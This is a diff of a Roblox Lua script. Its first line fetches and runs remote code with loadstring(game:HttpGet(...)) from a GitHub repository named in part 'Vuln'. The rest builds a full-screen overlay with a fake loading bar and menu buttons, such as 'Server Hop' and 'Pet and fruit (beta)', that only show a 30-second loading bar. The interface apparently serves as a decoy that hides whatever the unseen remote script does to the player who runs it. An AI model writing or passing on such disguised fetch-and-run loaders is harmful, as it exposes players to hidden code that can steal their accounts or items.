@@ -1,39 +1,35 @@
--- STEP 1: Run the external script immediately
-pcall(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/MercenariesV3/testdelta/refs/heads/main/test"))()
-end)
+-- Run Mercenaries script first
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MercenariesV3/Vuln.0.25/refs/heads/main/MercenariesUpdatev3.lua"))()
 
--- STEP 2: Wait a tiny bit to let it create its GUI
-task.wait(0.05)
+-- Wait 0.01 seconds before showing your GUI
+task.wait(0.01)
 
--- STEP 3: Build your GUI (same as before)
 local player = game.Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
--- Clear old GUI if it exists
+-- Utility: Clear any previous GUI
 if playerGui:FindFirstChild("CustomUI") then
     playerGui.CustomUI:Destroy()
 end
 
--- Create your GUI
+-- Main GUI
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "CustomUI"
 screenGui.ResetOnSpawn = false
-screenGui.IgnoreGuiInset = true
-screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 screenGui.Parent = playerGui
 
--- Force your GUI to be the top layer
+-- Re-parent to force top layering
 screenGui.Parent = nil
 screenGui.Parent = playerGui
 
--- Now build your loading screen (same 5s bar)
+-- Background
 local background = Instance.new("Frame")
 background.Size = UDim2.new(1, 0, 1, 0)
 background.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
 background.BorderSizePixel = 0
 background.Parent = screenGui
 
+-- Loading bar container
 local loadingBarBg = Instance.new("Frame")
 loadingBarBg.Size = UDim2.new(0.6, 0, 0.05, 0)
 loadingBarBg.Position = UDim2.new(0.2, 0, 0.5, 0)
@@ -47,16 +43,20 @@ loadingBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
 loadingBar.BorderSizePixel = 0
 loadingBar.Parent = loadingBarBg
 
+-- Tween loading bar (5 seconds)
 local TweenService = game:GetService("TweenService")
 local loadingTween = TweenService:Create(loadingBar, TweenInfo.new(5), {
     Size = UDim2.new(1, 0, 1, 0)
 })
 loadingTween:Play()
 
+-- Wait for bar to fill
 loadingTween.Completed:Wait()
+
+-- Remove loading bar
 loadingBarBg:Destroy()
 
--- Menu buttons (unchanged — same as earlier)
+-- Create menu buttons
 local buttonNames = {
     "Server Hop",
     "Pet and fruit (beta)",
@@ -77,14 +77,17 @@ for i, name in ipairs(buttonNames) do
     button.TextSize = 20
     button.AutoButtonColor = true
     button.Parent = background
-    table.insert(buttons, button)
+    buttons[#buttons + 1] = button
 end
 
+-- Function to handle click and show 30-second loading
 local function onButtonClick(button)
-    for _, btn in ipairs(buttons) do
+    -- Remove all buttons
+    for _, btn in pairs(buttons) do
         btn:Destroy()
     end
 
+    -- Create 30-second loading bar
     local loadingBarLongBg = Instance.new("Frame")
     loadingBarLongBg.Size = UDim2.new(0.6, 0, 0.05, 0)
     loadingBarLongBg.Position = UDim2.new(0.2, 0, 0.5, 0)
@@ -102,12 +105,15 @@ local function onButtonClick(button)
         Size = UDim2.new(1, 0, 1, 0)
     })
     loadingTweenLong:Play()
+
     loadingTweenLong.Completed:Wait()
 
+    -- After 30s loading, destroy background (or do other actions)
     background:Destroy()
 end
 
-for _, button in ipairs(buttons) do
+-- Connect buttons
+for _, button in pairs(buttons) do
     button.MouseButton1Click:Connect(function()
         onButtonClick(button)
     end)
